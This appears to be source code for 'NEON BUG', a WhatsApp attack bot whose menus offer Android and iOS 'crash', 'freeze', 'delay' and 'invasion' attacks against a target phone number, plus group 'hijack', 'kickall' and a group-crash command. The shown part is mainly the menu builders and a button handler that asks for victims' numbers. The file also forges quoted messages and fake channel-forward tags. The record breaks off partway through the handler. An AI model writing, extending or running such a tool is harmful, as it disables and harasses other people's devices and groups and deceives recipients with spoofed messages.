/*
 * ============================================
 * NEON.JS - NEON BUG
 * Created by: NEON BUG 
 * Telegram: NEON BUG
 * ============================================
 */

const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const os = require('os');
const helpers = require('./lib/helpers');
require('dotenv').config();
const DEVELOPER_LINKS = [process.env.DEVELOPER_LINK_1, process.env.DEVELOPER_LINK_2]
  .map(value => String(value || '').trim())
  .filter(Boolean);
let generateWAMessageContent, generateWAMessageFromContent, generateMessageID, proto;
const baileysReady = import('baileys').then((baileys) => {
  ({ generateWAMessageContent, generateWAMessageFromContent, generateMessageID, proto } = baileys);
  return baileys;
});
const { handleAntiFeatures, handleNeonGroupGuard, getExternalAdReply, createFakeQuote } = require('./lib/anti-features');
const {
  getOwnerPrefix,
  resolveOwnerNumber,
  getOwnerConfig,
  setOwnerConfig,
  normalizeNumber
} = require('./lib/owner');

// ============================================
// CONSOLE BANNER
// ============================================
console.log(chalk.red(`
███╗   ██╗███████╗ ██████╗ ███╗   ██╗    ██████╗ ██╗   ██╗ ██████╗ 
████╗  ██║██╔════╝██╔═══██╗████╗  ██║    ██╔══██╗██║   ██║██╔════╝ 
██╔██╗ ██║█████╗  ██║   ██║██╔██╗ ██║    ██████╔╝██║   ██║██║  ███╗
██║╚██╗██║██╔══╝  ██║   ██║██║╚██╗██║    ██╔══██╗██║   ██║██║   ██║
██║ ╚████║███████╗╚██████╔╝██║ ╚████║    ██████╔╝╚██████╔╝╚██████╔╝
╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═════╝  ╚═════╝  ╚═════╝
`));
console.log(chalk.red('☠️  NEON BUG - NEON BUG ☠️'));
console.log(chalk.white('    Created by: NEON BUG|  Telegram: ☠︎」*NEON* 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 𝘃𝟭.𝟬'));
console.log(chalk.red('☠️'.repeat(40)));
console.log('');

// ============================================
// GLOBAL VARIABLES
// ============================================
global.botStartTime = Date.now();

const DEVELOPER_LINK = DEVELOPER_LINKS[0] || '';
const withTimeout = (promise, milliseconds, label) => Promise.race([
  promise,
  new Promise((_, reject) => setTimeout(() => reject(new Error(`${label} timed out after ${milliseconds}ms`)), milliseconds))
]);

// ============================================
// HOST DETECTION
// ============================================
const getHostLabel = () => {
  if (
    process.env.RAILWAY_ENVIRONMENT ||
    process.env.RAILWAY_SERVICE_NAME ||
    process.env.RAILWAY_PROJECT_ID ||
    process.env.RAILWAY
  ) {
    return '🚂 Railway';
  }
  return '🐧 Linux';
};

// ============================================
// PROCESSED MESSAGES CACHE
// ============================================
const processedMessages = new Set();
const PROCESSED_CACHE_LIMIT = 1000;

const markMessageProcessed = (messageId) => {
  if (processedMessages.size >= PROCESSED_CACHE_LIMIT) {
    const firstId = processedMessages.values().next().value;
    processedMessages.delete(firstId);
  }
  processedMessages.add(messageId);
};

const isMessageProcessed = (messageId) => processedMessages.has(messageId);

// ============================================
// PENDING TARGET SESSIONS
// Used after button press to await target number
// ============================================
const pendingTargetSessions = new Map();

// ============================================
// HELPERS
// ============================================
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const getUptime = (startTime) => {
  const uptime = (Date.now() - startTime) / 1000;
  const days = Math.floor(uptime / 86400);
  const hours = Math.floor((uptime % 86400) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  if (days > 0) return `${days}d ${hours}h ${minutes}m`;
  if (hours > 0) return `${hours}h ${minutes}m ${seconds}s`;
  return `${minutes}m ${seconds}s`;
};

const toMathItalic = (text) => {
  const fontMap = {
    'A':'𝑨','B':'𝑩','C':'𝑪','D':'𝑫','E':'𝑬','F':'𝑭','G':'𝑮','H':'𝑯',
    'I':'𝑰','J':'𝑱','K':'𝑲','L':'𝑳','M':'𝑴','N':'𝑵','O':'𝑶','P':'𝑷',
    'Q':'𝑸','R':'𝑹','S':'𝑺','T':'𝑻','U':'𝑼','V':'𝑽','W':'𝑾','X':'𝑿',
    'Y':'𝒀','Z':'𝒁',
    'a':'𝒂','b':'𝒃','c':'𝒄','d':'𝒅','e':'𝒆','f':'𝒇','g':'𝒈','h':'𝒉',
    'i':'𝒊','j':'𝒋','k':'𝒌','l':'𝒍','m':'𝒎','n':'𝒏','o':'𝒐','p':'𝒑',
    'q':'𝒒','r':'𝒓','s':'𝒔','t':'𝒕','u':'𝒖','v':'𝒗','w':'𝒘','x':'𝒙',
    'y':'𝒚','z':'𝒛'
  };
  return text.split('').map(c => fontMap[c] || c).join('');
};

// ============================================
// JID HELPERS
// ============================================
const stripJid = (jid = '') => jid.split('@')[0].split(':')[0];

const getDeviceFromMsgId = (id = '') => {
  if (!id) return { label: '❓ Unknown Device', emoji: '❓' };
  if (id.startsWith('3EB0')) return { label: '🌐 WhatsApp Web', emoji: '🌐' };
  if (id.startsWith('3A') && id.length <= 22) return { label: '🍎 iOS (iPhone)', emoji: '🍎' };
  if (id.length > 22 || id.startsWith('BAE5')) return { label: '🤖 Android', emoji: '🤖' };
  if (id.startsWith('3A') && id.length > 22) return { label: '🖥️ Mac Desktop', emoji: '🖥️' };
  return { label: '🖥️ Desktop App', emoji: '🖥️' };
};

// ============================================
// EXPIRY DATE HELPER (30 days from now)
// ============================================
const getExpiryDate = () => {
  const d = new Date();
  d.setDate(d.getDate() + 30);
  return d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
};

// ============================================
// NEWSLETTER TAG CONTEXT
// Gives the "Ends on..." / "Code:" decoration
// seen on forwarded WhatsApp channel messages
// ============================================
const getNewsletterTag = () => ({
  forwardedNewsletterMessageInfo: {
    newsletterJid: '1203634246411268184@newsletter',
    newsletterName: '「☠︎」NEON BUG v1.0',
    serverMessageId: 143,
  },
  isForwarded: true,
  forwardingScore: 1,
  entryPointConversionSource: `Ends on ${getExpiryDate()}`,
  entryPointConversionApp: 'Code: 「☠︎」 NEON BUG',
});

console.log(chalk.green('✅ 𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 helpers initialized'));

// ============================================
// MENU SENDERS
// ============================================

// ── Reliable fallback menu ──
async function sendPlainMenu(sock, chatId, fakeQuote, prefix, reason = '') {
  const developerLines = DEVELOPER_LINKS.length
    ? DEVELOPER_LINKS.map((url, index) => `Contact Dev ${index + 1}: ${url}`).join('\n')
    : 'Developer links are not configured.';
  const text =
    `「☠︎」NEON BUG MENU\n\n` +
    `Prefix: ${prefix || '.'}\n\n` +
    `META BUGS\n` +
    `• ${prefix || '.'}neon-android\n` +
    `• ${prefix || '.'}neon-devine-freeze\n` +
    `• ${prefix || '.'}neon-delay\n` +
    `• ${prefix || '.'}neon-ios\n` +
    `• ${prefix || '.'}neon-invasion\n` +
    `• ${prefix || '.'}neon-freeze\n` +
    `• ${prefix || '.'}neon-gc\n\n` +
    `SYSTEM\n` +
    `• ${prefix || '.'}neon-antibug\n` +
    `• ${prefix || '.'}antispam\n` +
    `• ${prefix || '.'}antibot\n` +
    `• ${prefix || '.'}addsudo\n` +
    `• ${prefix || '.'}delsudo\n` +
    `• ${prefix || '.'}listsudo\n` +
    `• ${prefix || '.'}hijack\n` +
    `• ${prefix || '.'}kickall\n` +
    `• ${prefix || '.'}neon-list\n` +
    `• ${prefix || '.'}ping\n` +
    `• ${prefix || '.'}device\n\n` +
    `${developerLines}`;
  await sock.sendMessage(chatId, { text }, { quoted: fakeQuote });
  if (reason) console.error(`[menu] Rich menu unavailable: ${reason}`);
}

// ── SEND FULL COMMAND LIST (compatible with older WhatsApp clients) ──
async function sendCommandMenu(sock, chatId, fakeQuote, prefix) {
  // Always send the complete text menu first. This keeps .menu usable when a
  // WhatsApp client hides or rejects interactive/list-message payloads.
  await sendPlainMenu(sock, chatId, fakeQuote, prefix);
  const rows = [
    ['𓅓 META BUGS', [
      ['𓅓 NEON ANDROID', 'Android module · select to continue', 'btn_neon-android'],
      ['𓅓 NEON DEVINE-FREEZE', 'Android freeze module · select to continue', 'btn_neon-devine-freeze'],
      ['𓅓 NEON DELAY', 'Android delay module · select to continue', 'btn_neon-delay'],
      ['🍎 NEON IOS', 'iOS module · select to continue', 'btn_neon-ios'],
      ['🍎 NEON INVASION', 'iOS invasion module · select to continue', 'btn_neon-invasion'],
      ['🍎 NEON FREEZE', 'iOS freeze module · select to continue', 'btn_neon-freeze'],
      ['👥 NEON GC', 'Group command · select to continue', 'btn_neon-gc']
    ]],
    ['⚙️ SYSTEM', [
      ['🛡️ NEON ANTIBUG', 'Toggle antibug protection', 'btn_neon-antibug'],
      ['🚫 ANTISPAM', 'Toggle antispam protection', 'btn_antispam'],
      ['🤖 ANTIBOT', 'Toggle antibot protection', 'btn_antibot'],
      ['👑 ADDSUDO', 'Add a sudo user', 'btn_addsudo'],
      ['🚫 DELSUDO', 'Remove a sudo user', 'btn_delsudo'],
      ['📋 LISTSUDO', 'List sudo users', 'btn_listsudo'],
      ['👥 HIJACK', 'Group command', 'btn_hijack'],
      ['👥 KICKALL', 'Group command', 'btn_kickall'],
      ['📋 NEON LIST', 'List group members', 'btn_neon-list'],
      ['🏓 PING', 'Check response time', 'btn_ping'],
      ['📱 DEVICE', 'Show device usage', 'btn_device']
    ]]
  ];
  const listMessage = generateWAMessageFromContent(chatId, {
    listMessage: proto.Message.ListMessage.create({
      title: '☠️ NEON BUG v1.0',
      description: `「☠︎」 NEON BUG MENU\nPrefix: ${prefix || '.'}\nChoose a command below:`,
      buttonText: '☠️ Select Command',
      listType: 1,
      sections: rows.map(([title, entries]) => proto.Message.ListMessage.Section.create({
        title,
        rows: entries.map(([rowTitle, description, rowId]) => proto.Message.ListMessage.Row.create({
          title: rowTitle,
          description,
          rowId
        }))
      })),
      footerText: '「☠︎」 NEON BUG • Select a command'
    })
  }, { quoted: fakeQuote });
  try {
    await withTimeout(
      sock.relayMessage(chatId, listMessage.message, { messageId: listMessage.key.id }),
      20000,
      'full command menu relay'
    );
  } catch (err) {
    console.warn(chalk.yellow('[menu] Interactive list unavailable; text menu was sent:'), err.message);
  }
}

// ── SEND MAIN MENU (called by .menu cmd and button response) ──
async function sendMainMenu(sock, chatId, fakeQuote, prefix) {

  // ── Load media ──
  const menuImagePath = path.join(__dirname, '..', 'assets', 'menu.jpg');
  const menuVideoPath = path.join(__dirname, '..', 'assets', 'menu.mp4');

  let mediaBuffer = null;
  let mediaType = null;

  if (fs.existsSync(menuVideoPath)) {
    mediaBuffer = fs.readFileSync(menuVideoPath);
    mediaType = 'video';
  } else if (fs.existsSync(menuImagePath)) {
    mediaBuffer = fs.readFileSync(menuImagePath);
    mediaType = 'image';
  }

  const menuCaption =
    `「☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬\n\n` +
    `Prefix: ${prefix || '.'}\n` +
    `• ${prefix || '.'}ping\n` +
    `• ${prefix || '.'}neon-ios\n` +
    `• ${prefix || '.'}neon-android\n` +
    `• ${prefix || '.'}neon-devine-freeze\n` +
    `• ${prefix || '.'}neon-freeze\n` +
    `• ${prefix || '.'}neon-delay\n` +
    `• ${prefix || '.'}neon-invasion\n` +
    `• ${prefix || '.'}neon-gc\n` +
    `• ${prefix || '.'}neon-list\n\n` +
    `NEON BUG — select a command to continue.`;

  if (mediaBuffer && mediaType === 'image') {
    await sock.sendMessage(chatId, { image: mediaBuffer, caption: menuCaption }, { quoted: fakeQuote });
    return;
  }
  if (mediaBuffer && mediaType === 'video') {
    await sock.sendMessage(chatId, { video: mediaBuffer, caption: menuCaption }, { quoted: fakeQuote });
    return;
  }
  await sock.sendMessage(chatId, { text: menuCaption }, { quoted: fakeQuote });
}

// ── SEND CATEGORY LIST (Raid Bugs / System) ──
async function sendCategoryMenu(sock, chatId, fakeQuote) {
  const categoryMsg = generateWAMessageFromContent(chatId, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text:
              `☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬 𝗠𝗘𝗡𝗨𝗦\n\n` +
              `☠️ 𝗖𝗵𝗼𝗼𝘀𝗲 𝗮 𝗰𝗮𝘁𝗲𝗴𝗼𝗿𝘆 𝗯𝗲𝗹𝗼𝘄:`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '☠️𝑵𝑬𝑶𝑵 𝑩𝑼𝑮'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮',
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: 'NEON BUG MENU',
                url: DEVELOPER_LINK || '',
                copy_code: 'NEON BUG',
                expiration_time: Date.now() + 86400000
              }
            }),
            buttons: [{
              name: 'single_select',
              buttonParamsJson: JSON.stringify({
                title: '「☠︎」Select Category',
                sections: [{
                  title: 'NEON BUG MENU',
                  rows: [
                    {
                      header: '「☠︎」META BUGS',
                      title: 'Meta Bugs',
                      description: 'Android and iOS modules',
                      id: 'open_neon_modules'
                    },
                    {
                      header: '「☠︎」SYSTEM',
                      title: 'System',
                      description: 'Protection, sudo, group and utility tools',
                      id: 'open_system'
                    }
                  ]
                }]
              })
            }]
          })
        })
      }
    }
  }, { quoted: fakeQuote });

  await withTimeout(
    sock.relayMessage(chatId, categoryMsg.message, {
      messageId: categoryMsg.key.id
    }),
    20000,
    'interactive menu relay'
  );
}

// ── SEND RAID BUGS LIST ──
async function sendRaidBugsMenu(sock, chatId, fakeQuote) {
  const raidBugsImagePath = path.join(__dirname, '..', 'media', 'menu2.jpg');

  let headerImage = null;
  if (fs.existsSync(raidBugsImagePath)) {
    try {
      const imgBuffer = fs.readFileSync(raidBugsImagePath);
      const imgMsg = await generateWAMessageContent(
        { image: imgBuffer },
        { upload: sock.waUploadToServer }
      );
      headerImage = imgMsg.imageMessage;
    } catch (e) {
      console.warn(chalk.yellow('[sendRaidBugsMenu] Failed to load menu2.jpg:'), e.message);
    }
  }

  const bodyText =
    `╔════════ ════════ ════════╗\n` +
    `║     𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬   ║\n` +
    `╚══════ ════ ════════════ ═════╝\n\n` +
    `┏━✞︎𓅓 𝑨𝒏𝒅𝒓𝒐𝒊𝒅 𝑩𝒖𝒈𝒔  ━┓\n` +
    `  ☻︎ 𝗿𝗮𝗶𝗱𝗮𝗻𝗱𝗿𝗼𝗶𝗱\n` +
    `  ☻︎ 𝗱𝗲𝘃𝗶𝗻𝗲-𝗳𝗿𝗲𝗲𝘇𝗲\n` +
    `  ☻︎ 𝗿𝗮𝗶𝗱-𝗱𝗲𝗹𝗮𝘆\n` +
    `┗━━━━━ ━━━━ ━┛\n\n` +
    `┏━  𓅓 𝗶𝗢𝗦 𝑩𝒖𝒈𝒔  ━┓\n` +
    `  ✞︎ 𝗿𝗮𝗶𝗱𝗶𝗼𝘀\n` +
    `  ✞︎ 𝗻𝗶𝗴𝗵𝘁-𝗶𝗻𝘃𝗮𝘀𝗶𝗼𝗻\n` +
    `  ✞︎ 𝗼𝗯𝗶𝘁𝗼-𝗳𝗿𝗲𝗲𝘇𝗲\n` +
    `┗━━━━━▼・ᴥ・▼━━━━━━ ━━━┛\n\n` +
    `┏━  𓅓 𝑮𝑪 𝑩𝒖𝒈  ━┓\n` +
    `  ☻︎ 𝗿𝗮𝗶𝗱𝗴𝗰\n` +
    `┗━━━𓃰━━━━━𓅰━━━━┛\n\n` +
    `©☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬\n` +
    `━━━━━━━━━━𐂂━━━━━━━━━━━━━━━━━𓀬━━━━━━`;

  const messageParamsJson = JSON.stringify({
    limited_time_offer: {
      text: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮',
      url: DEVELOPER_LINK,
      copy_code: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮',
      expiration_time: Date.now() * 999
    }
  });

  const listMessage = generateWAMessageFromContent(chatId, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bodyText
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮  — ᴘʀᴇss ᴀ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴅᴇᴘʟᴏʏ'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: headerImage ? true : false,
            ...(headerImage && { imageMessage: headerImage })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            messageParamsJson,
            buttons: [
              {
                name: 'single_select',
                buttonParamsJson: JSON.stringify({
                  title: '「☠︎」Select Attack',
                  sections: [
                    {
                      title: '「☠︎」 Android Bugs',
                      rows: [
                        { header: '「☠︎」ʀᴀɪᴅᴀɴᴅʀᴏɪᴅ',    title: '「☠︎」ʀᴀɪᴅᴀɴᴅʀᴏɪᴅ',    description: 'Android crash attack',   id: 'btn_neon-android'   },
                        { header: '「☠︎」ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ', title: '「☠︎」ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ', description: 'Android freeze attack',  id: 'btn_neon-devine-freeze' },
                        { header: '「☠︎」ʀᴀɪᴅ-ᴅᴇʟᴀʏ',    title: '「☠︎」ʀᴀɪᴅ-ᴅᴇʟᴀʏ',    description: 'Android delay attack',   id: 'btn_neon-delay'    }
                      ]
                    },
                    {
                      title: '「☠︎」 iOS Bugs',
                      rows: [
                        { header: '「☠︎」ʀᴀɪᴅɪᴏs',        title: '「☠︎」ʀᴀɪᴅɪᴏs',        description: 'iOS crash attack',        id: 'btn_neon-ios'        },
                        { header: '「☠︎」ɴɪɢʜᴛ-ɪɴᴠᴀsɪᴏɴ', title: '「☠︎」ɴɪɢʜᴛ-ɪɴᴠᴀsɪᴏɴ', description: 'iOS invasion attack',     id: 'btn_neon-invasion' },
                        { header: '「☠︎」ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ',  title: '「☠︎」ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ',  description: 'iOS freeze attack',       id: 'btn_neon-freeze'   }
                      ]
                    },
                    {
                      title: '「☠︎」 GC Bug',
                      rows: [
                        { header: '「☠︎」ʀᴀɪᴅɢᴄ', title: '「☠︎」ʀᴀɪᴅɢᴄ', description: 'Group chat crash attack', id: 'btn_neon-gc' }
                      ]
                    }
                  ]
                })
              }
            ]
          })
        })
      }
    }
  }, { quoted: fakeQuote });

  await sock.relayMessage(chatId, listMessage.message, {
    messageId: listMessage.key.id
  });
}

// ── SEND SYSTEM MENU ──
async function sendSystemMenu(sock, chatId, fakeQuote) {
  const systemImagePath = path.join(__dirname, '..', 'media', 'menu3.jpg');

  let headerImage = null;
  if (fs.existsSync(systemImagePath)) {
    try {
      const imgBuffer = fs.readFileSync(systemImagePath);
      const imgMsg = await generateWAMessageContent(
        { image: imgBuffer },
        { upload: sock.waUploadToServer }
      );
      headerImage = imgMsg.imageMessage;
    } catch (e) {
      console.warn(chalk.yellow('[sendSystemMenu] Failed to load menu3.jpg:'), e.message);
    }
  }

  const bodyText =
    `╔════════════𓅰══════════𓀡═══════╗\n` +
    `║    「☠︎」 𝗦𝗬𝗦𝗧𝗘𝗠 「☠︎」        ║\n` +
    `╚═══════════════════════════════════╝\n\n` +
    `┏━  「☠︎」 𝑷𝒓𝒐𝒕𝒆𝒄𝒕𝒊𝒐𝒏  ━┓\n` +
    `  ➛ 𝗮𝗻𝘁𝗶𝗯𝘂𝗴\n` +
    `  ➛ 𝗮𝗻𝘁𝗶𝘀𝗽𝗮𝗺\n` +
    `  ➛ 𝗮𝗻𝘁𝗶𝗯𝗼𝘁\n` +
    `┗━━━━━━━━𓅿━━━━━━━━┛\n\n` +
    `┏━  「☠︎」 𝑺𝒖𝒅𝒐  ━┓\n` +
    `  ➛ 𝗮𝗱𝗱𝘀𝘂𝗱𝗼\n` +
    `  ➛ 𝗱𝗲𝗹𝘀𝘂𝗱𝗼\n` +
    `  ➛ 𝗹𝗶𝘀𝘁𝘀𝘂𝗱𝗼\n` +
    `┗━━━━━━━━𓅓━━━━┛\n\n` +
    `┏━  「☠︎」 𝑮𝒓𝒐𝒖𝒑  ━┓\n` +
    `  ➛ 𝗵𝗶𝗷𝗮𝗰𝗸\n` +
    `  ➛ 𝗸𝗶𝗰𝗸𝗮𝗹𝗹\n` +
    `  ➛ 𝗿𝗮𝗶𝗱𝗹𝗶𝘀𝘁\n` +
    `┗━━━━━━━━ ━━━━━━━━━━┛\n\n` +
    `┏━  「☠︎」 𝑼𝒕𝒊𝒍𝒔  ━┓\n` +
    `  ➛ 𝗽𝗶𝗻𝗴\n` +
    `  ➛ 𝗱𝗲𝘃𝗶𝗰𝗲\n` +
    `┗━━━━━━━━━━━━━━━━━━┛\n\n` +
    `© ☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

  const messageParamsJson = JSON.stringify({
    limited_time_offer: {
      text: '☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬 v1.0',
      url: DEVELOPER_LINK,
      copy_code: '𝑽𝑰𝑪𝑻𝑶𝑹𝒀 𝑻𝑬𝑪𝑯',
      expiration_time: Date.now() * 999
    }
  });

  const listMessage = generateWAMessageFromContent(chatId, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bodyText
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '「☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: headerImage ? true : false,
            ...(headerImage && { imageMessage: headerImage })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            messageParamsJson,
            buttons: [
              {
                name: 'single_select',
                buttonParamsJson: JSON.stringify({
                  title: '「☠︎」Select Option',
                  sections: [
                    {
                      title: '「☠︎」 Protection',
                      rows: [
                        { header: '「☠︎」ᴀɴᴛɪʙᴜɢ',  title: '「☠︎」ᴀɴᴛɪʙᴜɢ',  description: 'Toggle anti-bug',  id: 'btn_neon-antibug'  },
                        { header: '「☠︎」ᴀɴᴛɪsᴘᴀᴍ', title: '「☠︎」ᴀɴᴛɪsᴘᴀᴍ', description: 'Toggle anti-spam', id: 'btn_antispam' },
                        { header: '「☠︎」ᴀɴᴛɪʙᴏᴛ',  title: '「☠︎」ᴀɴᴛɪʙᴏᴛ',  description: 'Toggle anti-bot',  id: 'btn_antibot'  }
                      ]
                    },
                    {
                      title: '「☠︎」 Sudo',
                      rows: [
                        { header: '「☠︎」ᴀᴅᴅsᴜᴅᴏ',  title: '「☠︎」ᴀᴅᴅsᴜᴅᴏ',  description: 'Add sudo user',    id: 'btn_addsudo'  },
                        { header: '「☠︎」ᴅᴇʟsᴜᴅᴏ',  title: '「☠︎」ᴅᴇʟsᴜᴅᴏ',  description: 'Remove sudo user', id: 'btn_delsudo'  },
                        { header: '「☠︎」ʟɪsᴛsᴜᴅᴏ', title: '「☠︎」ʟɪsᴛsᴜᴅᴏ', description: 'List sudo users',  id: 'btn_listsudo' }
                      ]
                    },
                    {
                      title: '「☠︎」 Group',
                      rows: [
                        { header: '「☠︎」ʜɪᴊᴀᴄᴋ',   title: '「☠︎」ʜɪᴊᴀᴄᴋ',   description: 'Hijack group',      id: 'btn_hijack'   },
                        { header: '「☠︎」ᴋɪᴄᴋᴀʟʟ',  title: '「☠︎」ᴋɪᴄᴋᴀʟʟ',  description: 'Kick all members',  id: 'btn_kickall'  },
                        { header: '「☠︎」ʀᴀɪᴅʟɪsᴛ', title: '「☠︎」ʀᴀɪᴅʟɪsᴛ', description: 'View raid list',    id: 'btn_neon-list' }
                      ]
                    },
                    {
                      title: '「☠︎」 Utils',
                      rows: [
                        { header: '「☠︎」ᴘɪɴɢ',   title: '「☠︎」ᴘɪɴɢ',   description: 'Check bot ping',   id: 'btn_ping'   },
                        { header: '「☠︎」ᴅᴇᴠɪᴄᴇ', title: '「☠︎」ᴅᴇᴠɪᴄᴇ', description: 'Check device info', id: 'btn_device' }
                      ]
                    }
                  ]
                })
              }
            ]
          })
        })
      }
    }
  }, { quoted: fakeQuote });

  await sock.relayMessage(chatId, listMessage.message, {
    messageId: listMessage.key.id
  });
}

// ============================================
// ASK FOR TARGET (used after button press)
// ============================================
async function askForTarget(sock, chatId, sessionKey, command, label, fakeQuote) {
  pendingTargetSessions.set(sessionKey, { command, timestamp: Date.now(), fromButton: true });
  await sock.sendMessage(chatId, {
    text:
      `「☠︎」*${label}*\n\n` +
      `☠️ ☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬, ᴅʀᴏᴘ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ:\n\n` +
      `📲 *234✘✘✘✘✘✘✘✘✘✘*\n\n` +
      `_⏳ ʏᴏᴜ ʜᴀᴠᴇ 2 ᴍɪɴᴜᴛᴇs_`,
    contextInfo: getExternalAdReply()
  }, { quoted: fakeQuote });
}

// ============================================
// BUTTON RESPONSE HANDLER
// Maps button IDs to actions
// ============================================
async function handleButtonResponse(sock, chatId, sessionKey, buttonId, msg, isOwner, isSudo, prefix, groupMetadata, isGroupMsg, sender, botPhoneNumber, fakeQuote) {
  const adReply = getExternalAdReply();

  // ── Permission check for raid/system buttons ──
  if (!isOwner && !isSudo) {
    await sock.sendMessage(chatId, {
      text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`,
      contextInfo: adReply
    }, { quoted: fakeQuote });
    return;
  }

  switch (buttonId) {

    // ── MENUS NAV ──
    case 'open_neon_modules':
      await sendRaidBugsMenu(sock, chatId, fakeQuote);
      break;

    case 'open_system':
      await sendSystemMenu(sock, chatId, fakeQuote);
      break;

    // ── NEON MODULE BUTTONS ──
    case 'btn_neon-android':
      await askForTarget(sock, chatId, sessionKey, 'neon-android', 'NEON ANDROID 🤖', fakeQuote);
      break;

    case 'btn_neon-devine-freeze':
      await askForTarget(sock, chatId, sessionKey, 'neon-devine-freeze', 'NEON FREEZE 🤖', fakeQuote);
      break;

    case 'btn_neon-delay':
      await askForTarget(sock, chatId, sessionKey, 'neon-delay', 'NEON DELAY 🤖', fakeQuote);
      break;

    case 'btn_neon-ios':
      await askForTarget(sock, chatId, sessionKey, 'neon-ios', 'NEON IOS 🍎', fakeQuote);
      break;

    case 'btn_neon-invasion':
      await askForTarget(sock, chatId, sessionKey, 'neon-invasion', 'NEON INVASION 🍎', fakeQuote);
      break;

    case 'btn_neon-freeze':
      await askForTarget(sock, chatId, sessionKey, 'neon-freeze', 'NEON FREEZE 🍎', fakeQuote);
      break;

    case 'btn_neon-gc':
      if (!isGroupMsg) {
        await sock.sendMessage(chatId, {
          text: `⚠️ ᴜsᴇ ʀᴀɪᴅɢᴄ ɪɴsɪᴅᴇ ᴀ ɢʀᴏᴜᴘ ᴏʀ ᴘʀᴏᴠɪᴅᴇ ᴀ ɢʀᴏᴜᴘ ᴊɪᴅ! ☠️`,
          contextInfo: adReply
        }, { quoted: fakeQuote });
      } else {
        await sock.sendMessage(chatId, {
          text: `「☠︎」*NEON GC 💀*\n\n☠️ ᴅᴇᴘʟᴏʏɪɴɢ ᴏɴ ᴛʜɪs ɢʀᴏᴜᴘ...`,
          contextInfo: adReply
        }, { quoted: fakeQuote });
        await runNeonGc(sock, chatId, chatId, fakeQuote);
      }
      break;

    // ── SYSTEM BUTTONS ──
    case 'btn_ping': {
      const start = Date.now();
      const ping = Date.now() - start;
      const uptime = getUptime(global.botStartTime);
      await sock.sendMessage(chatId, {
        text: `🏓 𝗣𝗢𝗡𝗚: ${ping}𝚖𝚜 ⏰ 𝚄𝚙𝚝𝚒𝚖𝚎: ${uptime}`,
        contextInfo: adReply
      }, { quoted: fakeQuote });
      break;
    }

    case 'btn_device':
      await sock.sendMessage(chatId, {
        text:
          `⚠️ *ᴅᴇᴠɪᴄᴇ ᴜsᴀɢᴇ:*\n\n` +
          `› *${prefix}device* — ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ\n` +
          `› *${prefix}device @user*\n` +
          `› *${prefix}device 2348xxxxxxxxx*`,
        contextInfo: adReply
      }, { quoted: fakeQuote });
      break;

    case 'btn_neon-antibug': {
      const ownerNumber = resolveOwnerNumber(botPhoneNumber, null);
      const ownerConfig = getOwnerConfig(ownerNumber);
      const current = ownerConfig?.antibug || false;
      setOwnerConfig(ownerNumber, { antibug: !current });
      await sock.sendMessage(chatId, {
        text: `🛡️ 𝗔𝗡𝗧𝗜𝗕𝗨𝗚: ${!current ? '✅ ON' : '❌ OFF'}`,
        contextInfo: adReply
      }, { quoted: fakeQuote });
      break;
    }

    case 'btn_antispam': {
      if (!isGroupMsg) {
